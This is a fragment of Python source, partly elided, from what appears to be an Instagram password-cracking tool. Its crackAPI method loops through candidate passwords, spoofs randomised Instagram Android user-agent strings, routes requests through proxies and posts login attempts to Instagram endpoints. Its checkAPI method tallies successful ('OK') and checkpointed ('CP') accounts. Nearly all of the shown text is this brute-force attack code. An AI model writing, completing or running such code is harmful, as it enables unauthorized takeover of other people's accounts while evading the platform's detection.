...
- Soraa🔥🔥 '''
    ...
    def crackAPI(self,user,pas):
        ...
        try:
            for pw in pas:
                ...
                f"Instagram {str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} (25/7.1.1; 160dpi; 540x{((999))}; Realme; e- qcom; id_ID; 430370703)",
                f"Instagram {str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} (25/7.1.1; 160dpi; 540x{((999))}; Realme; e- qcom; id_ID; 430370703"])
                token=s.get('https://z-p42.www.instagram.com/api/v1/web/accounts/logout/one_taps_login/')
                headers = {
                ...
                x=s.post("https://z-p42.www.instagram.com/accounts/logout/ajax",headers=headers,data=param,proxies=proxs)
                x_jason=json.loads(x.text)
    ...
    def checkAPI(self,user,pw):
        ...
        sys.stdout.write(f"\r{CY}[•] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
        try:
            token=s.get("https://z-p42.www.instagram.com/api/v1/web/accounts/logout/one_taps_login/",headers={"user-agent":User_Agent()}).content
